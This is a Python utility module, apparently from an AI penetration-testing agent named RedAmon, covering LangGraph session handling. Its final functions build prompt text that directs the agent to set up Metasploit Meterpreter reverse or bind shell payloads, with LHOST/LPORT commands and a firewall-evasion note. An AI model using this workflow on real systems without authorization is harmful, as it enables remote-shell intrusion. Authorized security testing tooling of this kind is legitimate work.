"""
RedAmon Agent Utility Functions

Helper functions for the LangGraph agent orchestrator.
Includes session management, config creation, and response extraction.
"""

from typing import Dict, Any, List, TYPE_CHECKING

from state import AgentState
from params import (
    MAX_ITERATIONS,
    LHOST,
    LPORT,
    BIND_PORT_ON_TARGET,
    PAYLOAD_USE_HTTPS,
)

if TYPE_CHECKING:
    from langgraph.checkpoint.memory import MemorySaver



_checkpointer: "MemorySaver | None" = None


def set_checkpointer(cp: "MemorySaver") -> None:
    """Set the checkpointer reference (called by orchestrator)."""
    global _checkpointer
    _checkpointer = cp


def get_checkpointer() -> "MemorySaver | None":
    """Get the checkpointer reference."""
    return _checkpointer


def get_thread_id(user_id: str, project_id: str, session_id: str) -> str:
    """
    Create a unique thread_id for the checkpointer from identifiers.

    Args:
        user_id: User identifier
        project_id: Project identifier
        session_id: Session identifier

    Returns:
        Combined thread_id string for checkpointer
    """
    return f"{user_id}:{project_id}:{session_id}"


def parse_thread_id(thread_id: str) -> tuple[str, str, str]:
    """
    Parse a thread_id back into its components.

    Args:
        thread_id: Combined thread_id string

    Returns:
        Tuple of (user_id, project_id, session_id)
    """
    parts = thread_id.split(":", 2)
    if len(parts) == 3:
        return parts[0], parts[1], parts[2]
    return "unknown", "unknown", thread_id


def list_sessions(user_id: str, project_id: str) -> List[str]:
    """
    List all session_ids for a user/project.

    Args:
        user_id: User identifier
        project_id: Project identifier

    Returns:
        List of session_ids
    """
    prefix = f"{user_id}:{project_id}:"
    sessions = []

    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        for thread_id in cp.storage.keys():
            if thread_id.startswith(prefix):
                session_id = thread_id[len(prefix):]
                sessions.append(session_id)

    return sessions


def clear_session(user_id: str, project_id: str, session_id: str) -> None:
    """
    Clear a specific session from the checkpointer.

    Args:
        user_id: User identifier
        project_id: Project identifier
        session_id: Session identifier
    """
    thread_id = get_thread_id(user_id, project_id, session_id)

    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage') and thread_id in cp.storage:
        del cp.storage[thread_id]


def get_session_count() -> int:
    """Get total number of active sessions."""
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def get_message_count(user_id: str, project_id: str, session_id: str) -> int:
    """
    Get the number of messages in a session.

    Args:
        user_id: User identifier
        project_id: Project identifier
        session_id: Session identifier

    Returns:
        Number of messages in the session
    """
    thread_id = get_thread_id(user_id, project_id, session_id)

    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage') and thread_id in cp.storage:
        checkpoint = cp.storage.get(thread_id)
        if checkpoint and 'channel_values' in checkpoint:
            messages = checkpoint['channel_values'].get('messages', [])
            return len(messages)

    return 0


def create_config(
    user_id: str,
    project_id: str,
    session_id: str
) -> dict:
    """
    Create config for graph invocation with checkpointer thread_id.

    Config contains:
    - thread_id: For MemorySaver checkpointer (session persistence)
    - user_id, project_id, session_id: For logging in nodes

    Args:
        user_id: User identifier
        project_id: Project identifier
        session_id: Session identifier for conversation continuity

    Returns:
        Config dict for graph.invoke()
    """
    thread_id = get_thread_id(user_id, project_id, session_id)

    return {
        # LangGraph recursion limit - must be higher than MAX_ITERATIONS
        # Each iteration may have multiple graph transitions (think -> execute -> analyze)
        "recursion_limit": MAX_ITERATIONS * 5,
        "configurable": {
            "thread_id": thread_id,
            "user_id": user_id,
            "project_id": project_id,
            "session_id": session_id
        }
    }


def get_config_values(config) -> tuple[str, str, str]:
    """
    Extract user_id, project_id, session_id from config.

    Use in nodes for logging:
        user_id, project_id, session_id = get_config_values(config)
        logger.info(f"[{user_id}/{project_id}/{session_id}] Processing...")

    Args:
        config: The config dict or RunnableConfig passed to graph nodes

    Returns:
        Tuple of (user_id, project_id, session_id)
    """
    if config is None:
        return ("unknown", "unknown", "unknown")

    # LangGraph passes RunnableConfig - try multiple ways to access configurable
    configurable = None

    # Method 1: Direct dict access
    if isinstance(config, dict):
        configurable = config.get("configurable", {})
    # Method 2: RunnableConfig object with configurable attribute
    elif hasattr(config, 'configurable'):
        configurable = config.configurable or {}
    # Method 3: Try .get() method (duck typing)
    elif hasattr(config, 'get'):
        configurable = config.get("configurable", {})

    if configurable is None:
        return ("unknown", "unknown", "unknown")

    # Extract values from configurable
    if isinstance(configurable, dict):
        return (
            configurable.get("user_id", "unknown"),
            configurable.get("project_id", "unknown"),
            configurable.get("session_id", "unknown")
        )
    elif hasattr(configurable, 'get'):
        return (
            configurable.get("user_id", "unknown"),
            configurable.get("project_id", "unknown"),
            configurable.get("session_id", "unknown")
        )
    else:
        return (
            getattr(configurable, "user_id", "unknown"),
            getattr(configurable, "project_id", "unknown"),
            getattr(configurable, "session_id", "unknown")
        )


def get_identifiers(state: AgentState, config = None) -> tuple[str, str, str]:
    """
    Get user_id, project_id, session_id from config with state fallback.

    This is the preferred method for nodes - it tries config first,
    then falls back to state values (set by _initialize_node).

    Args:
        state: The AgentState containing user/project/session from initialization
        config: Optional config dict from LangGraph

    Returns:
        Tuple of (user_id, project_id, session_id)
    """
    user_id, project_id, session_id = get_config_values(config)

    # Fallback to state values if config doesn't have them
    if user_id == "unknown":
        user_id = state.get("user_id", "unknown")
    if project_id == "unknown":
        project_id = state.get("project_id", "unknown")
    if session_id == "unknown":
        session_id = state.get("session_id", "unknown")

    return (user_id, project_id, session_id)


def extract_response(state: AgentState) -> Dict[str, Any]:
    """
    Extract the response data from the final state.

    Args:
        state: The final agent state after execution

    Returns:
        Dictionary with answer, tool_used, tool_output, and error fields
    """
    return {
        "answer": state.get("final_answer", ""),
        "tool_used": state.get("tool_used"),
        "tool_output": state.get("tool_output"),
        "error": state.get("error")
    }


def is_session_config_complete() -> tuple[bool, list[str]]:
    """
    Check if session configuration is complete for exploitation.

    Decision Logic:
        IF LPORT is set (not None, > 0):
            → Use REVERSE payload (target connects TO attacker)
            → Requires: LHOST + LPORT
        ELSE IF BIND_PORT_ON_TARGET is set:
            → Use BIND payload (attacker connects TO target)
            → Requires: BIND_PORT_ON_TARGET only (no LHOST needed)
        ELSE:
            → No mode configured, cannot proceed

    Returns:
        Tuple of (is_complete, missing_params_list)
        - is_complete: True if all required params are set
        - missing_params_list: List of parameter names that are missing
    """
    use_reverse = LPORT is not None and LPORT > 0
    use_bind = not use_reverse and BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    missing = []

    if use_reverse:
        # REVERSE mode: need LHOST and LPORT
        if not LHOST:
            missing.append("LHOST")
        # LPORT is already set (that's why use_reverse is True)
    elif use_bind:
        # BIND mode: only needs BIND_PORT_ON_TARGET, which is already set
        pass
    else:
        # Neither mode configured - need at least one
        missing.append("LPORT or BIND_PORT_ON_TARGET")

    return (len(missing) == 0, missing)


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic:
        IF LPORT is set (not None, > 0):
            → Use REVERSE payload (target connects TO attacker)
            → Requires: LHOST + LPORT
        ELSE:
            → Use BIND payload (attacker connects TO target)
            → Requires: BIND_PORT_ON_TARGET (becomes LPORT in Metasploit)

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # -------------------------------------------------------------------------
    # CHECK FOR MISSING PARAMETERS
    # -------------------------------------------------------------------------
    use_reverse = LPORT is not None and LPORT > 0
    use_bind = not use_reverse and BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    missing_params = []

    if use_reverse:
        # REVERSE mode: need LHOST and LPORT
        if not LHOST:
            missing_params.append(("LHOST", "Your attacker IP address (e.g., 172.28.0.2, 10.10.14.5)"))
        # LPORT is already set (that's why use_reverse is True)
    elif use_bind:
        # BIND mode: need BIND_PORT_ON_TARGET (already set)
        pass
    else:
        # Neither LPORT nor BIND_PORT_ON_TARGET is set - cannot proceed!
        missing_params.append(("LPORT or BIND_PORT_ON_TARGET", "Either set LPORT for reverse payload OR BIND_PORT_ON_TARGET for bind payload"))

    lines = []
    lines.append("### Pre-Configured Payload Settings")
    lines.append("")

    # -------------------------------------------------------------------------
    # HANDLE MISSING PARAMETERS - ASK USER
    # -------------------------------------------------------------------------
    if missing_params:
        lines.append("⚠️ **MISSING REQUIRED PARAMETERS - ASK USER BEFORE EXPLOITING!**")
        lines.append("")
        lines.append("The following parameters are not configured. You MUST ask the user:")
        lines.append("")
        for param, description in missing_params:
            lines.append(f"- **{param}**: {description}")
        lines.append("")
        lines.append("Use `action: \"ask_user\"` to request these values before proceeding.")
        lines.append("")
        lines.append("---")
        lines.append("")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if use_reverse:
        # =====================================================================
        # REVERSE PAYLOAD: Target connects TO attacker (LHOST:LPORT)
        # =====================================================================
        lhost_display = LHOST if LHOST else "<ASK USER>"

        lines.append("**Mode: REVERSE** (target connects to you)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│   TARGET    │ ───connects to───► │  ATTACKER   │")
        lines.append(f"│             │                    │ {lhost_display}:{LPORT} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")

        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines.append(f"**Payload type:** `{conn_type}` ({reason})")
        lines.append("")
        lines.append("**IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
        lines.append("```")
        lines.append("show targets")
        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter reverse payload from `show payloads`:**")
        lines.append("")
        lines.append(f"Look for payloads with `meterpreter/{conn_type}` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append(f"- `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)")
        lines.append(f"- `linux/*/meterpreter/{conn_type}` for Linux native binaries")
        lines.append(f"- `windows/*/meterpreter/{conn_type}` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append(f"set PAYLOAD <chosen_payload_from_show_payloads>")
        if LHOST:
            lines.append(f"set LHOST {LHOST}")
        else:
            lines.append("set LHOST <ASK USER FOR IP>")
        lines.append(f"set LPORT {LPORT}")
        lines.append("```")
        lines.append("")
        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif use_bind:
        # =====================================================================
        # BIND PAYLOAD: Attacker connects TO target (RHOST:BIND_PORT)
        # =====================================================================
        lines.append("**Mode: BIND** (you connect to target)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│  ATTACKER   │ ───connects to───► │   TARGET    │")
        lines.append(f"│    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter bind payload from `show payloads`:**")
        lines.append("")
        lines.append("Look for payloads with `meterpreter/bind_tcp` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append("- `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)")
        lines.append("- `linux/*/meterpreter/bind_tcp` for Linux native binaries")
        lines.append("- `windows/*/meterpreter/bind_tcp` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        lines.append(f"set LPORT {BIND_PORT_ON_TARGET}")
        lines.append("```")
        lines.append("")
        lines.append("**Note:** NO LHOST needed for bind payloads!")
        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for connection.")

    else:
        # =====================================================================
        # NO MODE CONFIGURED - CRITICAL ERROR
        # =====================================================================
        lines.append("❌ **NO PAYLOAD MODE CONFIGURED**")
        lines.append("")
        lines.append("Neither LPORT nor BIND_PORT_ON_TARGET is set in params.py.")
        lines.append("")
        lines.append("**Ask the user which mode to use:**")
        lines.append("")
        lines.append("1. **REVERSE** (target connects to you):")
        lines.append("   - Ask: \"What is your attacker IP (LHOST)?\"")
        lines.append("   - Ask: \"What port should I listen on (LPORT)? Default: 4444\"")
        lines.append("")
        lines.append("2. **BIND** (you connect to target):")
        lines.append("   - Ask: \"What port should the target open (BIND_PORT)? Default: 4444\"")
        lines.append("")
        lines.append("Use `action: \"ask_user\"` to gather this information.")

    lines.append("")
    lines.append("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)
